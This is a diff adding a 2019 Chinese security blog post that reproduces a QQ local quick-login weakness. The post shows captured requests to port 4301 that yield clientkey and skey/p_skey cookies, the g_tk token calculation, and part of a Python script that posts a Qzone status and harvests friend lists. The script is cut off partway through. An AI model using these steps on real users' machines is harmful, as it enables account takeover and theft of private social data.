@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
+
+
+
+
+<title>大黑客们是如何帮你发说说的--记一次QQ本地快捷登录漏洞复现 | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/blog/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/blog/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/blog/js/script.js"></script>
+    
+    <script src="/blog/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+
+
+
+  <!-- for theme: default is false -->
+  <!-- for page: default is true -->
+
+<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+	
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/blog/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+			expand_toc()
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">大黑客们是如何帮你发说说的--记一次QQ本地快捷登录漏洞复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">一月 22, 2019</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/blog/category/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="背景">背景</h2>
+<p>昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧登录了QQ。</p>
+<p>稍微花了一些时间，弄清楚了这些漏洞的原理，搞了一下复现。</p>
+<p>本篇文章就来说一说这些黑阔是怎么帮我发说说的。 <a id="more"></a></p>
+<h2 id="冷静分析">冷静分析</h2>
+<p>遇到这种情况，一开始想到的是CSRF，毕竟之前遇到过“QQ空间蠕虫”这样的事情，但是结合去网吧的行为，并没有打开什么网页，登录了空间并进行其他什么操作，故排除。
+那么猜测，很大概率是因为在网吧开黑的时候登录了QQ，然后获取到了本地QQ的一些权限，被代替进行了一些高权限操作，那么我们有理由怀疑这个权限是在登录了QQ后获取的，并且能够不需要用户的额外操作就能获取到这些权限。根据这个方向，经过一些查阅资料，基本坐实了是本地快捷登录造成的凭证窃取。</p>
+<h2 id="罪魁祸首快捷登录">罪魁祸首——快捷登录</h2>
+<p>以下是对整套黑产行为的概括：</p>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Blank_Diagram.png">
+对快捷登录研究了一下午，也用python做了复现。时间仓促，写的比较随意，望见谅。</p>
+<h2 id="技术分析">技术分析</h2>
+<p>QQ现在实现快捷登录的方式是这样的 1.
+本地起一个服务器，本地侦听<code>4301</code>端口，等待本地应用与其进行HTTP交互</p>
+<ol start="2" type="1">
+<li><p>应用按照接口要求，从远程服务器获取<code>pt_local_token</code>，然后带着这个参数请求4301端口，获取本地登录的账号信息</p></li>
+<li><p>拿到账号后，再次请求本地的<code>4301</code>端口，请求指定账号登录<code>cookie</code>，获得<code>clientkey</code></p></li>
+<li><p>请求远程登录服务器，获取对应账号的对应业务的cookie，然后就是请求一个检查的网页，通过验证，返回认证令牌（<code>skey</code>）。带着这个令牌就可以对应用进行登录了</p></li>
+</ol>
+<p>可以看出，<strong>本地的任何应用都可以与QQ建立的本地服务器进行交互，获取到账号信息，进而进行快捷登录</strong>。而漏洞就出在这。</p>
+<p>于是我们现在尝试对快捷登录的请求进行详细的抓包分析。 1.
+向远处服务器请求，获取到<code>pt_local_token</code>参数</p>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11-13-27.jpg">以及请求的域名<code>xui.ptlogin2.qq.com</code>，该域名的作用就是获取凭证。</p>
+<pre><code>GET /cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1 HTTP/1.1
+Host: xui.ptlogin2.qq.com</code></pre>
+<p><strong>url</strong>其中的一些参数并不需要理会，抓个包复制上去就好。需要注意的是，这个请求检查了<code>Referer</code>，所以<code>Referer</code>要改成<code>*.qq.com</code>
+在上述请求的响应中，服务器设置了<code>pt_local_token</code>这个cookie，后续的计算也是围绕着这个参数展开。</p>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11-16-45.jpg">2.
+而客户端会带着参数<code>pt_local_token</code>，对本地的指定端口进行请求，获取账号信息。我们可以思考一下是谁在这个端口侦听。</p>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11-19-08.jpg">请求返回的是一段JS：</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: Application/javascript
+Content-Length: 323
+
+var var_sso_uin_list=[&#123;&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:0,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;T3stzer0&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:4719111&#125;,&#123;&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:534,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;T3stzer0&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:32142&#125;];ptui_getuins_CB(var_sso_uin_list);</code></pre>
+<p>这里面包含本地已登录的账户信息，包括账号，昵称和性别以及一些其他参数。</p>
+<p>从这一步结束，我们就已经能获取到当前登录到本地的QQ的一些基本信息了，而接下来的步骤便是拿着<code>pt_local_token</code>获取更多信息，以及更大的权限。</p>
+<p>3.
+带着<code>pt_local_token</code>以及账号对本地端口进行请求，获取指定账号的<code>clientkey</code></p>
+<pre><code>GET /pt_get_st?clientuin=3537***086&amp;callback=ptui_getst_CB&amp;r=0.03809848617064593&amp;pt_local_tk=2008428654 HTTP/1.1
+Host: localhost.ptlogin2.qq.com:4301</code></pre>
+<p>其中参数<code>clientuin</code>是Q号，<code>r</code>是随机数，可以随便给，<code>pt_local_tk</code>就是<code>pt_local_token</code>
+请求响应返回一个<code>clientkey</code>的<code>Set-Cookie</code>字段中的值</p>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12-05-55.jpg"></p>
+<p>4. 带着包含<code>clientkey</code>的cookie向远程服务器进行登录</p>
+<pre><code>GET /jump?clientuin=3537***086&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_local_tk=2008428654&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40 HTTP/1.1
+Host: ssl.ptlogin2.qq.com</code></pre>
+<p>其中<code>clientuin</code>是账号，<code>u1</code>是对应业务的地址，各种带着<code>id</code>的字段应该都是对应业务，抓个包复制下来就好了，不用太在意。
+这一步并不需要什么认证，带上刚才的Cookie，发送对应的请求就可以获得登录的Cookie（包含<code>skey</code>字段），以及会返回一个验证的网址，需要<code>GET</code>一下这个网址才能获取到真正的应用登录Cookie（包含<code>p_skey</code>字段）
+请求响应：</p>
+<pre><code>HTTP/1.1 200 OK
+Date: Tue, 22 Jan 2019 03:27:50 GMT
+Content-Type: application/javascript
+P3P: CP=CAO PSA OUR
+Server: Tencent Login Server/2.0.0
+Strict-Transport-Security: max-age=31536000
+Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com;
+Set-Cookie: pt2gguin=o3534***3086;Expires=Tue, 19 Jan 2038 03:14:07 GMT;Path=/;Domain=ptlogin2.qq.com;
+Set-Cookie: ETK=;Path=/;Domain=ptlogin2.qq.com;
+Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;
+Set-Cookie: skey=@72eionO2j;Path=/;Domain=qq.com;
+省略若干Set-Cookie
+
+ptui_qlogin_CB(&#39;0&#39;, &#39;https://ptlogin2.qzone.qq.com/check_sig?pttype=2&amp;uin=3534***3086&amp;service=jump&amp;nodirect=0&amp;ptsigx=a1199b83fbabffba57f259d79a1d2f221d70579cde815b7284a9d8201fc4d9a34bc133aacc444dd2309b1908aa05393ddc39433&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=5&amp;j_later=0&amp;low_login_hour=0&amp;regmaster=0&amp;pt_login_type=2&amp;pt_aid=549000912&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0&#39;, &#39;&#39;)</code></pre>
+<p>返回的是一段JS，里面的网址是验证网址，我们需要请求它通过验证，不需要额外的参数，直接请求返回回来的这一串网址
+5. 请求第4步返回的验证网址即可获得完整的登录权限</p>
+<pre><code>HTTP/1.1 302 Found
+Date: Tue, 22 Jan 2019 03:27:50 GMT
+Server: Tencent Login Server/2.0.0
+Strict-Transport-Security: max-age=31536000
+Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;
+Set-Cookie: skey=@72fei1O2j;Path=/;Domain=qq.com;
+Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com; pt4_token=dZaYtbPkQf38MeZh8ik9jOmLtrxcrEMguvM_;Path=/;Domain=qzone.qq.com;
+Set-Cookie: p_skey=hlcQmdkZHYwNk5y2XGipsSOm0Igjj7AKo_;Path=/;Domain=qzone.qq.com;Secure;
+...</code></pre>
+<p>很明显，通过上述步骤获得到凭证<code>p_skey</code>之后，我们可以收集各类QQ相关的操作接口进行操作，如自动的发一条“奇怪的”说说。</p>
+<h3 id="对本地账号自动发一条说说">对本地账号自动发一条说说</h3>
+<p>要实现这个目的无非就是完成上面的快捷登录，然后再在空间里面寻求发说说的请求，模拟一下即可
+基本的抓包找参数的功夫就不细说了
+值得一提的是空间是有CSRF防御的，所以需要找到两个参数才能发送说说</p>
+<ol type="1">
+<li><strong>qzone_token</strong></li>
+<li><strong>g_tk</strong></li>
+</ol>
+<p>其中<code>qzone_token</code>是刷新空间的时候在页面中给你的一个<code>token</code>，直接正则拿到就好</p>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12-23-40.jpg"></p>
+<p>而追踪<code>g_tk</code>参数花了我不少功夫，其源码在<a target="_blank" rel="noopener" href="https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js">https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js</a>
+的<code>getACSRFToken</code>函数中：</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>getACSRFToken<span class="op">:</span><span class="kw">function</span>(url) &#123;</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    url <span class="op">=</span> QZFL<span class="op">.</span><span class="at">util</span><span class="op">.</span><span class="fu">URI</span>(url)<span class="op">;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> skey<span class="op">;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (url) &#123;</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> (url<span class="op">.</span><span class="at">host</span> <span class="op">&amp;&amp;</span> url<span class="op">.</span><span class="at">host</span><span class="op">.</span><span class="fu">indexOf</span>(<span class="st">&quot;qzone.qq.com&quot;</span>) <span class="op">&gt;</span> <span class="dv">0</span>) &#123;</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> &#123;</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>          skey <span class="op">=</span> QZONE<span class="op">.</span><span class="at">FP</span><span class="op">.</span><span class="at">_t</span><span class="op">.</span><span class="at">QZFL</span><span class="op">.</span><span class="at">cookie</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;p_skey&quot;</span>)<span class="op">;</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>        &#125; <span class="cf">catch</span> (err) &#123;</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>          skey <span class="op">=</span> QZFL<span class="op">.</span><span class="at">cookie</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;p_skey&quot;</span>)<span class="op">;</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>      &#125; <span class="cf">else</span> &#123;</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (url<span class="op">.</span><span class="at">host</span> <span class="op">&amp;&amp;</span> url<span class="op">.</span><span class="at">host</span><span class="op">.</span><span class="fu">indexOf</span>(<span class="st">&quot;qq.com&quot;</span>) <span class="op">&gt;</span> <span class="dv">0</span>) &#123;</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>          skey <span class="op">=</span> QZFL<span class="op">.</span><span class="at">cookie</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;skey&quot;</span>)<span class="op">;</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>      &#125;</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span>skey) &#123;</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>      skey <span class="op">=</span> QZFL<span class="op">.</span><span class="at">cookie</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;p_skey&quot;</span>) <span class="op">||</span> (QZFL<span class="op">.</span><span class="at">cookie</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;skey&quot;</span>) <span class="op">||</span> (QZFL<span class="op">.</span><span class="at">cookie</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;rv2&quot;</span>) <span class="op">||</span> <span class="st">&quot;&quot;</span>))<span class="op">;</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> hash <span class="op">=</span> <span class="dv">5381</span><span class="op">;</span></span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">var</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">,</span> len <span class="op">=</span> skey<span class="op">.</span><span class="at">length</span><span class="op">;</span>i <span class="op">&lt;</span> len<span class="op">;++</span>i) &#123;</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>      hash <span class="op">+=</span> (hash <span class="op">&lt;&lt;</span> <span class="dv">5</span>) <span class="op">+</span> skey<span class="op">.</span><span class="fu">charCodeAt</span>(i)<span class="op">;</span></span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> hash <span class="op">&amp;</span> <span class="dv">2147483647</span><span class="op">;</span></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>  &#125;</span></code></pre></div>
+<p>其实就是各种判断<code>Cookie</code>里面是否存在<code>skey</code>或者<code>p_skey</code>然后拿来做一个简单的移位加密
+核心代码就这点，比较简单。</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a> <span class="kw">var</span> hash <span class="op">=</span> <span class="dv">5381</span><span class="op">;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">var</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">,</span> len <span class="op">=</span> skey<span class="op">.</span><span class="at">length</span><span class="op">;</span>i <span class="op">&lt;</span> len<span class="op">;++</span>i) &#123;</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>      hash <span class="op">+=</span> (hash <span class="op">&lt;&lt;</span> <span class="dv">5</span>) <span class="op">+</span> skey<span class="op">.</span><span class="fu">charCodeAt</span>(i)<span class="op">;</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> hash <span class="op">&amp;</span> <span class="dv">2147483647</span><span class="op">;</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>  &#125;</span></code></pre></div>
+<p>所以可以看出<code>g_tk</code>是由<code>p_skey</code>简单的移位加密生成的，那么抓包一下发说说的请求</p>
+<pre><code>https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken=&#123;&#125;&amp;g_tk=&#123;&#125;</code></pre>
+<p>将<code>qzonetoken</code>和<code>g_tk</code>放进去，再在<code>POST</code>数据里面的<code>con</code>字段变成你想发的说说，就可以完成类似于你在我电脑上登录QQ，我就能代替你发说说，无感知地查看好友信息，看空间隐私等等。
+### 复现脚本 花了几个小时写了复现脚本
+<strong>只要脚本运行，在本机上线的QQ都会发一条说说以及被获取到所有好友信息、备注、昵称以及好友分组</strong></p>
+<ol type="1">
+<li>检测本地账号</li>
+</ol>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12-35-52.jpg"></p>
+<ol start="2" type="1">
+<li>发送指定说说</li>
+</ol>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12-36-12.jpg"></p>
+<ol start="3" type="1">
+<li>获取好友列表信息以及分组</li>
+</ol>
+<p><img src="/blog/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12-39-22.jpg"></p>
+<p>测试源码如下，仅供学习之用，了解其原理，禁止用于非法用途！</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> re</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 计算发送说说的防御CSRF的Token</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> getACSRFToken(p_skey):</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>    hash_v <span class="op">=</span> <span class="dv">5381</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> p_skey:</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(p_skey)):</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>            hash_v <span class="op">+=</span> (hash_v <span class="op">&lt;&lt;</span> <span class="dv">5</span>) <span class="op">+</span> <span class="bu">ord</span>(p_skey[i])</span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> hash_v <span class="op">&amp;</span> <span class="dv">2147483647</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="va">None</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="co"># 想要发送的说说</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>Message <span class="op">=</span> <span class="st">&quot;This is an automated messaging test by wz&quot;</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>header <span class="op">=</span> &#123;</span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;User-Agent&quot;</span>: <span class="st">&quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&quot;</span>,</span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;Referer&quot;</span>: <span class="st">&quot;https://i.qq.com/&quot;</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>&#125;</span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a><span class="co"># 从QQ服务器获取请求本地服务器的Cookie</span></span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a>get_local_token_url <span class="op">=</span> <span class="st">&quot;https://xui.ptlogin2.qq.com/cgi-bin/xlogin?&quot;</span> \</span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;&quot;</span> \</span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;&quot;</span> \</span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;appid=549000912&amp;style=22&amp;target=self&amp;&quot;</span> \</span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;s_url=https%3A</span><span class="sc">%2F%2F</span><span class="st">qzs.qzone.qq.com</span><span class="sc">%2F</span><span class="st">qzone</span><span class="sc">%2F</span><span class="st">v5</span><span class="sc">%2F</span><span class="st">loginsucc.html</span><span class="sc">%3F</span><span class="st">para%3Dizone&amp;pt_qr_app=</span><span class="sc">%E</span><span class="st">6</span><span class="sc">%89%</span><span class="st">8B</span><span class="sc">%E</span><span class="st">6%9C%BAQQ</span><span class="sc">%E</span><span class="st">7%A9%BA</span><span class="sc">%E</span><span class="st">9</span><span class="sc">%97%</span><span class="st">B4&amp;&quot;</span> \</span>
